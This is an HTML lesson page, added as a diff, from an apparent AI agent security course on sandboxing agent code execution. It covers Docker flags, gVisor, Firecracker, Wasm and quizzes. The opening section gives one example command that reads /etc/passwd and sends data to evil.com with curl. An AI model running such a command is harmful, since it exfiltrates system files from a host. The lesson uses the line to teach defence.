@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lesson 02 — Tool Sandboxing: Containerized Execution and Ephemeral Filesystems</title>
+<link rel="stylesheet" href="../../../assets/css/tokens.css">
+<link rel="stylesheet" href="../../../assets/css/components.css">
+</head>
+<body class="lesson-body" data-course="ai-agent-security" data-lesson="2" data-lesson-id="tool-sandboxing-containerized-execution">
+
+<div class="readbar"><div class="fill" id="readFill"></div></div>
+<div class="readpill"><span class="dot"></span><span id="readPct">0%</span></div>
+
+<div class="lesson-wrap">
+
+  <div class="lesson-top">
+    <a class="lesson-back" href="../course.html">← Course map</a>
+    <span class="lesson-progress-mini">
+      <span class="track"><i id="miniFill"></i></span>
+      <span id="miniPct">0%</span>
+    </span>
+  </div>
+
+  <span class="lesson-kicker"><span class="n">Lesson 02</span> · Tool Sandboxing</span>
+
+  <h1 class="lesson-title">Tool Sandboxing: Containerized Execution and Ephemeral Filesystems</h1>
+  <p class="lesson-lede">
+    Isolating code execution: Docker sandboxes, gVisor, WebAssembly (Wasm), read-only root filesystems, and disposable runner pools.
+  </p>
+
+  <div class="lesson-meta">
+    <span><b>Time</b> ~10 min</span>
+    <span><b>Win</b> You know how to architect hardened container sandboxes using Docker, gVisor, and network isolation.</span>
+    <span><b>Mission link</b> Mastering tool sandboxing: containerized execution and ephemeral filesystems across modern software engineering</span>
+  </div>
+
+  <h2><span class="n">1</span>Core principles of Tool Sandboxing: Containerized Execution and Ephemeral Filesystems</h2>
+  <p>If an agent has a tool to run Python code (`execute_python_code(script)`), what happens if the model runs: <code>import os; os.system("cat /etc/passwd; curl evil.com/leak")</code>? If executed directly on your host server, <strong>your infrastructure is compromised immediately</strong>.</p>
+
+  <div class="note">
+    <span class="note-label">Key idea</span>
+    Isolating code execution: Docker sandboxes, gVisor, WebAssembly (Wasm), read-only root filesystems, and disposable runner pools.
+  </div>
+
+  <div id="predict1"></div>
+
+  <h2><span class="n">2</span>The Hardened Container Sandbox</h2>
+  <p><strong>Tool Sandboxing</strong> enforces hard isolation:</p>
+
+  <div id="diagram1"></div>
+
+  <h2><span class="n">3</span>Docker vs gVisor vs Firecracker</h2>
+  <ul><li><strong>1. Ephemeral Docker Containers:</strong> Every task executes in a fresh, disposable container that is destroyed on completion. Any files created or deleted vanish with the container!</li><li><strong>2. Sandboxed Kernels (gVisor / Firecracker):</strong> Traditional Docker containers share the host Linux kernel. Hardened sandboxes (Google gVisor or AWS Firecracker microVMs) intercept all system calls, preventing container escape exploits!</li><li><strong>3. Read-Only Root Filesystems (`--read-only`):</strong> The operating system files are completely read-only. The agent can only write to a temporary, memory-backed `/tmp` directory.</li><li><strong>4. WebAssembly (Wasm) Micro-Sandboxes:</strong> Run Python and JavaScript tools compiled to WebAssembly (Wasmtime). Wasm runs in a memory-safe sandbox with zero access to the filesystem, network, or OS unless explicitly granted!</li></ul><pre><code># Launching a Hardened Docker Sandbox for Agent Code Execution:
+docker run --rm -i \
+    --network none \
+    --read-only \
+    --tmpfs /tmp:rw,noexec,nosuid,size=64m \
+    --user 1000:1000 \
+    --cap-drop ALL \
+    --memory 256m \
+    --cpus 1.0 \
+    python:3.12-slim python -c "print('Isolated, secure execution!')"</code></pre><div class="callout"><p><strong>The Zero-Network Sandbox Flag:</strong> For pure code execution tools that don't need the internet, always pass <code>--network none</code>. An agent cannot exfiltrate data if it has no network interface.</p></div>
+
+  <div id="trace1"></div>
+
+  <h2><span class="n">4</span>Practice</h2>
+  <p>Complete the tool sandboxing sentence</p>
+
+  <div id="fill1"></div>
+
+  <div class="win">
+    <h3>✓ Your win for today</h3>
+    <p>You know how to architect hardened container sandboxes using Docker, gVisor, and network isolation.</p>
+  </div>
+
+  <h2><span class="n">5</span>Do this next</h2>
+  <ol>
+    <li>Audit your project code and identify where tool sandboxing: containerized execution and ephemeral filesystems applies.</li>
+    <li>Author a unit test or verification script exercising tool sandboxing: containerized execution and ephemeral filesystems.</li>
+    <li>Document team architectural conventions regarding tool sandboxing: containerized execution and ephemeral filesystems.</li>
+  </ol>
+
+  <div class="note">
+    <span class="note-label">Primary source</span>
+    Industry standards and best practices for Tool Sandboxing: Containerized Execution and Ephemeral Filesystems.
+  </div>
+
+  <div class="ask-teacher">
+    <b>Stuck, or curious?</b> Ask your teacher — there are no bad questions here.
+  </div>
+
+  <div id="quiz"></div>
+
+  <div id="lessonNav"></div>
+
+  <div class="course-map">
+    <h3>Course map</h3>
+    <div id="courseMap"></div>
+  </div>
+
+</div>
+
+<script src="../../../assets/js/icons.js"></script>
+<script src="../lessons.js"></script>
+<script src="../../../assets/js/teach/lesson-engine.js"></script>
+<script src="../../../assets/js/teach/quiz.js"></script>
+<script src="../../../assets/js/teach/widgets.js"></script>
+<script>
+  TeachWidgets.predict("#predict1", {
+    q: "Why must an AI agent that executes Python code or bash commands run strictly inside an isolated container sandbox?",
+    a: ["To prevent malicious or buggy code from accessing the host operating system, stealing host credentials, or corrupting the host filesystem","Because containers make Python run faster","Containers are required by tax law","Containers eliminate API token costs"],
+    c: 0,
+    why: "Sandboxing isolates untrusted execution, preventing agents from damaging the host operating system."
+  });
+
+  TeachWidgets.diagram("#diagram1", {
+    boxes: [
+      {
+            "title": "1. --network none",
+            "lines": [
+                  "Completely disables network interface",
+                  "Exfiltration physically impossible"
+            ]
+      },
+      {
+            "title": "2. --read-only root",
+            "lines": [
+                  "OS files cannot be altered or overwritten",
+                  "Only ephemeral /tmp writable"
+            ]
+      },
+      {
+            "title": "3. --user non-root (1000)",
+            "lines": [
+                  "No sudo or root kernel privileges",
+                  "Confined to unprivileged user"
+            ]
+      },
+      {
+            "title": "4. Disposable Lifecycle",
+            "lines": [
+                  "Spins up in 100ms, destroyed on exit",
+                  "Zero residual state pollution"
+            ]
+      }
+]
+  });
+
+  TeachWidgets.trace("#trace1", {
+    code: [
+      "# Tracing Tool Sandboxing: Containerized Execution and Ephemeral Filesystems",
+      "def execute_flow():",
+      "    # Isolating code execution: Docker sandboxes, gVisor...",
+      "    return True"
+],
+    steps: [
+      {
+            "line": 1,
+            "vars": {
+                  "phase": "Initialize",
+                  "concept": "Tool Sandboxing: Containerized Execution and Ephemeral Filesystems"
+            }
+      },
+      {
+            "line": 2,
+            "vars": {
+                  "phase": "Execution",
+                  "state": "Active"
+            }
+      },
+      {
+            "line": 4,
+            "vars": {
+                  "phase": "Result",
+                  "status": "Success"
+            }
+      },
+      {
+            "line": 1,
+            "vars": {
+                  "step": "Standard Docker"
+            }
+      },
+      {
+            "line": 2,
+            "vars": {
+                  "step": "Google gVisor"
+            }
+      },
+      {
+            "line": 3,
+            "vars": {
+                  "step": "AWS Firecracker"
+            }
+      }
+]
+  });
+
+  TeachWidgets.fill("#fill1", {
+    label: "From memory — fill in the core terms",
+    lines: [
+      "Tool sandboxing isolates untrusted agent code execution using disposable containers with read-only filesystems, non-root users, and disabled {1} to prevent data {2}."
+],
+    blanks: [
+      {
+            "a": [
+                  "networking"
+            ],
+            "why": "--network none flag"
+      },
+      {
+            "a": [
+                  "exfiltration"
+            ],
+            "why": "Transmitting stolen secrets to external servers"
+      }
+]
+  });
+
+  TeachQuiz.mount("#quiz", [
+    {
+      q: "What security risk does passing '--network none' to a Docker code execution container eliminate?",
+      a: ["It prevents the container from sending outbound HTTP/TCP requests, making external data exfiltration and reverse shell connections impossible","It makes Python run faster","It eliminates CPU usage","It deletes all files"],
+      c: 0,
+      why: "Disabling the network stack prevents any outbound communication, neutralizing exfiltration."
+    },
+    {
+      q: "What is Google gVisor and why is it used for high-risk agent code execution?",
+      a: ["An application kernel written in Go that intercepts and sandboxes all Linux system calls, providing strong isolation between container and host","A brand of computer glasses","A web browser plugin","A database query optimizer"],
+      c: 0,
+      why: "gVisor prevents container-escape exploits by virtualizing Linux system calls in user space."
+    },
+    {
+      q: "Why is running agent code execution containers as an unprivileged non-root user (e.g. UID 1000) essential?",
+      a: ["It prevents the agent from modifying system binaries, installing rogue packages, or exploiting host-level root vulnerabilities","Non-root containers are free of charge","Linux requires UID 1000 for Python","Root containers use more RAM"],
+      c: 0,
+      why: "Non-root execution bounds the capabilities of untrusted processes inside the container."
+    },
+    {
+      q: "What happens to files written to an ephemeral Docker container when execution finishes with '--rm'?",
+      a: ["The container and its temporary filesystem are completely destroyed and purged, leaving zero residual files or state","The files are uploaded to GitHub","The files are saved to the desktop","The files are emailed to the administrator"],
+      c: 0,
+      why: "Ephemeral containers guarantee clean state reset with zero disk persistence across runs."
+    }
+  ]);
+</script>
+</body>
+</html>
